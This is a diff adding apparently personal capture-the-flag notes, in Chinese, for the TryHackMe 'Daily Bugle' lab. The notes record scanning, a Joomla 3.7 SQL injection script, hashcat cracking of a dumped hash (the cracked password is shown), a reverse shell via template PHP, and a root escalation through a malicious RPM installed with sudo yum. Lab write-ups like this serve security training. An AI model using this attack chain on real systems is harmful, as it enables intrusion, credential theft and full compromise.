@@ -1,0 +1,28 @@
+nmap -sV -sC -Pn 10.10.211.105 > nmap.txt
+gobuster dir -u http://10.10.216.42/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,aspx > gobuster.txt
+
+
+1.nmap掃描可以發現80port
+2.gobuster查找到readme.txt可以看到版本是3.7
+3.根據版本找到python的SQL Injection腳本
+4.使用python腳本取得帳號密碼
+python joomblah.py http://10.10.216.42
+5.使用hashcat查找出密碼spiderman123
+hashcat -m 3200  hash /usr/share/wordlists/rockyou.txt
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+6.登入後台後,找到extention的template新增beez3
+7.可以直接將php code貼進去,點上面preview template執行,取得reverse shell
+8.在/var/www/html/config.php可以找到DB密碼,嘗試可以登入用戶jjameson
+9.發現有sudo yum可以使用,生成reverse rpm
+fpm -n root -s dir -t rpm -a all --before-install /home/kali/timmy/TryHackMe/Daily_Bugle/root.sh /home/kali/timmy/TryHackMe/Daily_Bugle/
+10.安裝root取得reverse shell
+sudo dnf install -y root-1.0-1.noarch.rpm
+
+
+
+[-] Fetching CSRF token
+[-] Testing SQLi
+('  -  Found table:', 'fb9j5_users')
+('  -  Extracting users from', 'fb9j5_users')
+(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
+('  -  Extracting sessions from', 'fb9j5_session')
